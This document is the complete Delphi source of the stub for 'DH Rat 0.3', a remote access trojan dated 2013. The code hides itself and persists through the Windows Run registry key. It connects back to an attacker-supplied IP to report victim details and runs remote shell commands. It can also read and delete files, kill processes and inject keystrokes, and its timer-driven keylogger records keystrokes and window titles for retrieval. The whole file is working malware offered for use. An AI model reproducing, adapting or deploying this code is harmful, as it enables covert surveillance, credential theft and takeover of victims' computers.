// DH Rat 0.3
// (C) Doddy Hackman 2013

// Stub

unit stub;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, MMSystem, ComObj, ShellApi, tlhelp32, IdBaseComponent,
  IdComponent, IdTCPConnection, IdTCPClient, IdHTTP, IdIPMCastBase,
  IdIPMCastServer, ScktComp, sButton, ExtCtrls;

type
  TForm1 = class(TForm)
    IdHTTP1: TIdHTTP;
    ClientSocket1: TClientSocket;
    Timer1: TTimer;
    Timer2: TTimer;
    function datanow(): string;
    procedure ClientSocket1Read(Sender: TObject; Socket: TCustomWinSocket);
    procedure sButton1Click(Sender: TObject);
    procedure ClientSocket1Connect(Sender: TObject; Socket: TCustomWinSocket);
    procedure FormCreate(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure Timer2Timer(Sender: TObject);

  private
    Nombre2: string;
    { Private declarations }

  public
    { Public declarations }

  end;

var
  Form1: TForm1;
  acatoy: string;

implementation

{$R *.dfm}
{$POINTERMATH ON}
// Functions

function dhencode(texto, opcion: string): string;
// Thanks to Taqyon
// Based on http://www.vbforums.com/showthread.php?346504-DELPHI-Convert-String-To-Hex
var
  num: integer;
  aca: string;
  cantidad: integer;

begin

  num := 0;
  Result := '';
  aca := '';
  cantidad := 0;

  if (opcion = 'encode') then
  begin
    cantidad := Length(texto);
    for num := 1 to cantidad do
    begin
      aca := IntToHex(ord(texto[num]), 2);
      Result := Result + aca;
    end;
  end;

  if (opcion = 'decode') then
  begin
    cantidad := Length(texto);
    for num := 1 to cantidad div 2 do
    begin
      aca := Char(StrToInt('$' + Copy(texto, (num - 1) * 2 + 1, 2)));
      Result := Result + aca;
    end;
  end;

end;

procedure savefile(filename, texto: string);
var
  ar: TextFile;

begin

  try

    begin
      AssignFile(ar, filename);
      FileMode := fmOpenWrite;

      if FileExists(filename) then
        Append(ar)
      else
        Rewrite(ar);

      Write(ar, texto);
      CloseFile(ar);
    end;
  except
    //
  end;

end;

function regex(text: String; deaca: String; hastaaca: String): String;
begin
  Delete(text, 1, AnsiPos(deaca, text) + Length(deaca) - 1);
  SetLength(text, AnsiPos(hastaaca, text) - 1);
  Result := text;
end;

function listardirectorio(dir: string): string;
var

  busqueda: TSearchRec;
  code: string;

begin

  code := '';

  FindFirst(dir + '\*.*', faAnyFile + faDirectory + faReadOnly, busqueda);

  code := code + '[+] : ' + busqueda.Name + sLineBreak;

  while FindNext(busqueda) = 0 do
  begin
    code := code + '[+] : ' + busqueda.Name + sLineBreak;
  end;

  Result := code;
  FindClose(busqueda);

end;

function borraresto(archivo: string): string;
var
  code: string;
begin

  code := '';

  if DirectoryExists(archivo) then
  begin
    if (RemoveDir(archivo)) then
    begin
      code := '[+] Directory removed';
    end
    else
    begin
      code := '[+] Error';
    end;
  end;
  if FileExists(archivo) then
  begin
    if (DeleteFile(archivo)) then
    begin
      code := '[+] File removed';
    end
    else
    begin
      code := '[+] Error';
    end;
  end;

  Result := code;

end;

function LeerArchivo(const archivo: TFileName): String;
var
  lista: TStringList;
begin

  if (FileExists(archivo)) then
  begin

    lista := TStringList.Create;
    lista.Loadfromfile(archivo);
    Result := lista.text;
    lista.Free;

  end;

end;

function lectora(opcion: string): string;
var
  code: string;
begin

  code := '';

  if (opcion = 'open') then
  begin
    mciSendString('Set cdaudio door open wait', nil, 0, 0);
    code := '[+] Open CD : OK';
  end
  else
  begin
    mciSendString('Set cdaudio door closed wait', nil, 0, 0);
    code := '[+] Close CD : OK';
  end;

  Result := code;

end;

function cambiar_barra(opcion: string): string;
var
  code: string;
begin
  code := '';

  if (opcion = 'hide') then
  begin
    ShowWindow(FindWindow('Shell_TrayWnd', nil), SW_HIDE);
    code := '[+] Hidden Taskbar : OK';
  end
  else
  begin
    ShowWindow(FindWindow('Shell_TrayWnd', nil), SW_SHOWNA);
    code := '[+] Show Taskbar : OK';
  end;

  Result := code;

end;

function cambiar_iconos(opcion: string): string;
var
  code: string;
  acatoy: THandle;
begin
  code := '';
  acatoy := FindWindow('ProgMan', nil);
  acatoy := GetWindow(acatoy, GW_CHILD);
  if (opcion = 'hide') then
  begin
    ShowWindow(acatoy, SW_HIDE);
    code := '[+] Hidden Icons : OK';
  end
  else
  begin
    ShowWindow(acatoy, SW_SHOW);
    code := '[+] Show Icons : OK';
  end;
  Result := code;
end;

function mensaje(texto: string): string;
var
  code: string;
begin
  code := '';
  ShowMessage(texto);
  code := '[+] Message Sent';
  Result := code;
end;

function hablar(text: string): string;
var
  Voice: Variant;
  code: string;
begin
  code := '';
  Voice := CreateOLEObject('SAPI.SpVoice');
  Voice.speak(text);
  code := '[+] Voice Speak : OK';
  Result := code;
end;

function SendKeys(texto: string): string;
// Thanks to Remy Lebeau for the help
var
  eventos: PInput;
  controlb, controla: integer;
  code: string;
begin

  code := '';
  code := '[+] SendKeys : OK';

  GetMem(eventos, SizeOf(TInput) * (Length(texto) * 2));

  controla := 0;

  for controlb := 1 to Length(texto) do
  begin

    eventos[controla].Itype := INPUT_KEYBOARD;
    eventos[controla].ki.wVk := 0;
    eventos[controla].ki.wScan := ord(texto[controlb]);
    eventos[controla].ki.dwFlags := KEYEVENTF_UNICODE;
    eventos[controla].ki.time := 0;
    eventos[controla].ki.dwExtraInfo := 0;

    Inc(controla);

    eventos[controla].Itype := INPUT_KEYBOARD;
    eventos[controla].ki.wVk := 0;
    eventos[controla].ki.wScan := ord(texto[controlb]);
    eventos[controla].ki.dwFlags := KEYEVENTF_UNICODE or KEYEVENTF_KEYUP;
    eventos[controla].ki.time := 0;
    eventos[controla].ki.dwExtraInfo := 0;

    Inc(controla);

  end;

  SendInput(controla, eventos[0], SizeOf(TInput));

  Result := code;

end;

function escribir_word(texto: string): string;
var
  code: string;
begin
  code := '';
  code := '[+] Word Joke : OK';
  ShellExecute(0, nil, PChar('winword.exe'), nil, nil, SW_SHOWNORMAL);
  Sleep(5000);
  SendKeys(texto);
  Result := code;

end;

function listarprocesos(): string;
var
  conector: THandle;
  timbre: LongBool;
  indicio: TProcessEntry32;
  code: string;

begin

  code := '';

  conector := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  indicio.dwSize := SizeOf(indicio);

  timbre := Process32First(conector, indicio);

  while timbre do

  begin

    code := code + '[+] Name : ' + indicio.szExeFile + ' [+] PID : ' + IntToStr
      (indicio.th32ProcessID) + sLineBreak;

    timbre := Process32Next(conector, indicio);

  end;

  Result := code;

end;

function matarproceso(pid: string): string;
var
  vano: THandle;
  code: string;

begin

  code := '';
  vano := OpenProcess(PROCESS_TERMINATE, FALSE, StrToInt(pid));

  if TerminateProcess(vano, 0) then
  begin
    code := '[+] Kill Process : OK';
  end
  else
  begin
    code := '[+] Kill Process : ERROR';
  end;

  Result := code;

end;

function ejecutar(cmd: string): string;
// Credits : Function ejecutar() based in : http://www.delphidabbler.com/tips/61
// Thanks to www.delphidabbler.com

var
  parte1: TSecurityAttributes;
  parte2: TStartupInfo;
  parte3: TProcessInformation;
  parte4: THandle;
  parte5: THandle;
  control2: Boolean;
  contez: array [0 .. 255] of AnsiChar;
  notengoidea: Cardinal;
  fix: Boolean;
  code: string;

begin

  code := '';

  with parte1 do
  begin
    nLength := SizeOf(parte1);
    bInheritHandle := True;
    lpSecurityDescriptor := nil;
  end;

  CreatePipe(parte4, parte5, @parte1, 0);

  with parte2 do
  begin
    FillChar(parte2, SizeOf(parte2), 0);
    cb := SizeOf(parte2);
    dwFlags := STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES;
    wShowWindow := SW_HIDE;
    hStdInput := GetStdHandle(STD_INPUT_HANDLE);
    hStdOutput := parte5;
    hStdError := parte5;
  end;

  fix := CreateProcess(nil, PChar('cmd.exe /C ' + cmd), nil, nil, True, 0, nil,
    PChar('c:/'), parte2, parte3);

  CloseHandle(parte5);

  if fix then

    repeat

    begin
      control2 := ReadFile(parte4, contez, 255, notengoidea, nil);
    end;

    if notengoidea > 0 then
    begin
      contez[notengoidea] := #0;
      code := code + contez;
    end;

    until not(control2) or (notengoidea = 0);

    Result := code;

end;

function crazy_mouse(number: string): string;
var
  i: integer;
  code: string;
begin
  code := '';
  For i := 1 to StrToInt(number) do
  begin
    Sleep(1000);
    SetCursorPos(i, i);
  end;
  code := '[+] Crazy Mouse : OK';
  Result := code;
end;

function TForm1.datanow(): string;
var
  code: string;
  ip: string;
  pais: string;
  re: string;
  username: string;
  os: string;

begin

  try
    begin
      code := IdHTTP1.Get('http://whatismyipaddress.com/');

      ip := regex(code, 'alt="Click for more about ', '"></a>');
      pais := regex(code, '<tr><th>Country:</th><td>', '</td></tr>');

      if (ip = '') then
      begin
        ip := '?';
      end;

      if (pais = '') then
      begin
        pais := '?';
      end;

      username := GetEnvironmentVariable('username');
      os := GetEnvironmentVariable('os');

      re := '[datos_nuevos][ip]' + ip + '[ip]' + '[pais]' + pais + '[pais]' +
        '[username]' + username + '[username]' + '[os]' + os + '[os]';
    end;
  except
    //
  end;

  Result := re;

end;

//

procedure TForm1.ClientSocket1Connect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
  ClientSocket1.Socket.SendText(datanow());
end;

procedure TForm1.ClientSocket1Read(Sender: TObject; Socket: TCustomWinSocket);
var
  code: string;
  argumento: string;
begin
  code := Socket.ReceiveText;

  argumento := regex(code, '[argumento]', '[argumento]');

  if (Pos('![opencd]', code) > 0) then
  begin
    ClientSocket1.Socket.SendText(lectora('open'));
  end;

  if (Pos('![closecd]', code) > 0) then
  begin
    ClientSocket1.Socket.SendText(lectora('close'));
  end;

  if (Pos('![listardirectorio]', code) > 0) then
  begin
    ClientSocket1.Socket.SendText(listardirectorio(argumento));
  end;

  if (Pos('![borraresto]', code) > 0) then
  begin
    ClientSocket1.Socket.SendText(borraresto(argumento));
  end;

  if (Pos('![leerarchivo]', code) > 0) then
  begin
    ClientSocket1.Socket.SendText(LeerArchivo(argumento));
  end;

  if (Pos('![keyloggerlogs]', code) > 0) then
  begin
    ClientSocket1.Socket.SendText('![keyloggerlogs]<br>' + LeerArchivo(acatoy));
  end;

  if (Pos('![sendkeys]', code) > 0) then
  begin
    ClientSocket1.Socket.SendText(SendKeys(argumento));
  end;

  if (Pos('![escribirword]', code) > 0) then
  begin
    ClientSocket1.Socket.SendText(escribir_word(argumento));
  end;

  if (Pos('![mensaje]', code) > 0) then
  begin
    ClientSocket1.Socket.SendText(mensaje(argumento));
  end;

  if (Pos('![hablar]', code) > 0) then
  begin
    ClientSocket1.Socket.SendText(hablar(argumento));
  end;

  if (Pos('![matarproceso]', code) > 0) then
  begin
    ClientSocket1.Socket.SendText(matarproceso(argumento));
  end;

  if (Pos('![ejecutar]', code) > 0) then
  begin
    ClientSocket1.Socket.SendText(ejecutar(argumento));
  end;

  if (Pos('![crazymouse]', code) > 0) then
  begin
    ClientSocket1.Socket.SendText(crazy_mouse(argumento));
  end;

  if (Pos('![ocultartaskbar]', code) > 0) then
  begin
    ClientSocket1.Socket.SendText(cambiar_barra('hide'));
  end;

  if (Pos('![volvertaskbar]', code) > 0) then
  begin
    ClientSocket1.Socket.SendText(cambiar_barra('na'));
  end;

  if (Pos('![ocultariconos]', code) > 0) then
  begin
    ClientSocket1.Socket.SendText(cambiar_iconos('hide'));
  end;

  if (Pos('![volvericonos]', code) > 0) then
  begin
    ClientSocket1.Socket.SendText(cambiar_iconos('na'));
  end;

  if (Pos('![listarprocesos]', code) > 0) then
  begin
    ClientSocket1.Socket.SendText(listarprocesos());
  end;

end;

procedure TForm1.FormCreate(Sender: TObject);
var
  dir_hide, dir, carpeta, nombrereal, directorio, rutareal, yalisto: string;
  registro: HKEY;
  ip: string;

  ob: THandle;
  code: Array [0 .. 9999 + 1] of Char;
  nose: DWORD;
  todo: string;

begin

  Application.ShowMainForm := FALSE;

  ob := INVALID_HANDLE_VALUE;
  code := '';

  ob := CreateFile(PChar(paramstr(0)), GENERIC_READ, FILE_SHARE_READ, nil,
    OPEN_EXISTING, 0, 0);
  if (ob <> INVALID_HANDLE_VALUE) then
  begin
    SetFilePointer(ob, -9999, nil, FILE_END);
    ReadFile(ob, code, 9999, nose, nil);
    CloseHandle(ob);
  end;

  todo := regex(code, '[63686175]', '[63686175]');
  todo := dhencode(todo, 'decode');

  ip := regex(todo, '[ip]', '[ip]');

  try
    begin
      dir_hide := GetEnvironmentVariable('USERPROFILE') + '/';
      carpeta := 'ratata';

      dir := dir_hide + carpeta + '/';

      if not(DirectoryExists(dir)) then
      begin
        CreateDir(dir);
      end;

      ChDir(dir);

      nombrereal := ExtractFileName(paramstr(0));
      rutareal := dir;
      yalisto := dir + nombrereal;

      acatoy := dir + 'logs.html';

      MoveFile(PChar(paramstr(0)), PChar(yalisto));

      SetFileAttributes(PChar(dir), FILE_ATTRIBUTE_HIDDEN);

      SetFileAttributes(PChar(yalisto), FILE_ATTRIBUTE_HIDDEN);

      RegCreateKeyEx(HKEY_LOCAL_MACHINE,
        'Software\Microsoft\Windows\CurrentVersion\Run\', 0, nil,
        REG_OPTION_NON_VOLATILE, KEY_WRITE, nil, registro, nil);
      RegSetValueEx(registro, 'uberk', 0, REG_SZ, PChar(yalisto), 666);
      RegCloseKey(registro);

      savefile('logs.html',
        '<style>body {background-color: black;color:#00FF00;cursor:crosshair;}</style>');

      ClientSocket1.Address := ip;
      ClientSocket1.Port := 6664;
      ClientSocket1.Open;

    end;
  except
    //
  end;

end;

procedure TForm1.sButton1Click(Sender: TObject);
begin
  ClientSocket1.Socket.SendText(datanow());
end;

procedure TForm1.Timer1Timer(Sender: TObject);
var
  i: integer;
  Result: Longint;
  mayus: integer;
  shift: integer;

const

  n_numeros_izquierda: array [1 .. 10] of string =
    ('48', '49', '50', '51', '52', '53', '54', '55', '56', '57');

const
  t_numeros_izquierda: array [1 .. 10] of string =
    ('0', '1', '2', '3', '4', '5', '6', '7', '8', '9');

const
  n_numeros_derecha: array [1 .. 10] of string =
    ('96', '97', '98', '99', '100', '101', '102', '103', '104', '105');

const
  t_numeros_derecha: array [1 .. 10] of string =
    ('0', '1', '2', '3', '4', '5', '6', '7', '8', '9');

const
  n_shift: array [1 .. 22] of string = ('48', '49', '50', '51', '52', '53',
    '54', '55', '56', '57', '187', '188', '189', '190', '191', '192', '193',
    '291', '220', '221', '222', '226');

const
  t_shift: array [1 .. 22] of string = (')', '!', '@', '#', '\$', '%', '¨',
    '&', '*', '(', '+', '<', '_', '>', ':', '\', ' ? ', ' / \ ', '}', '{', '^',
    '|');

const
  n_raros: array [1 .. 17] of string = ('1', '8', '13', '32', '46', '187',
    '188', '189', '190', '191', '192', '193', '219', '220', '221', '222',
    '226');

const
  t_raros: array [1 .. 17] of string = ('[mouse click]', '[backspace]',
    '<br>[enter]<br>', '[space]', '[suprimir]', '=', ',', '-', '.', ';', '\',
    ' / ', ' \ \ \ ', ']', '[', '~', '\/');

begin

  // Others

  for i := Low(n_raros) to High(n_raros) do
  begin
    Result := GetAsyncKeyState(StrToInt(n_raros[i]));
    If Result = -32767 then
    begin
      savefile('logs.html', t_raros[i]);
    end;
  end;

  // Numbers

  for i := Low(n_numeros_derecha) to High(n_numeros_derecha) do
  begin
    Result := GetAsyncKeyState(StrToInt(n_numeros_derecha[i]));
    If Result = -32767 then
    begin
      savefile('logs.html', t_numeros_derecha[i]);
    end;
  end;

  for i := Low(n_numeros_izquierda) to High(n_numeros_izquierda) do
  begin
    Result := GetAsyncKeyState(StrToInt(n_numeros_izquierda[i]));
    If Result = -32767 then
    begin
      savefile('logs.html', t_numeros_izquierda[i]);
    end;
  end;

  // SHIFT

  if (GetAsyncKeyState(VK_SHIFT) <> 0) then
  begin

    for i := Low(n_shift) to High(n_shift) do
    begin
      Result := GetAsyncKeyState(StrToInt(n_shift[i]));
      If Result = -32767 then
      begin
        savefile('logs.html', t_shift[i]);
      end;
    end;

    for i := 65 to 90 do
    begin
      Result := GetAsyncKeyState(i);
      If Result = -32767 then
      Begin
        savefile('logs.html', Chr(i + 0));
      End;
    end;

  end;

  // MAYUS

  if (GetKeyState(20) = 0) then
  begin
    mayus := 32;
  end
  else
  begin
    mayus := 0;
  end;

  for i := 65 to 90 do
  begin
    Result := GetAsyncKeyState(i);
    If Result = -32767 then
    Begin
      savefile('logs.html', Chr(i + mayus));
    End;
  end;

end;

procedure TForm1.Timer2Timer(Sender: TObject);
var
  ventana1: array [0 .. 255] of Char;
  nombre1: string;

begin

  GetWindowText(GetForegroundWindow, ventana1, SizeOf(ventana1));

  nombre1 := ventana1;

  if not(nombre1 = Nombre2) then
  begin
    Nombre2 := nombre1;
    savefile('logs.html',
      '<hr style=color:#00FF00><h2><center>' + Nombre2 + '</h2></center><br>');
  end;

end;

//

end.

// The End ?
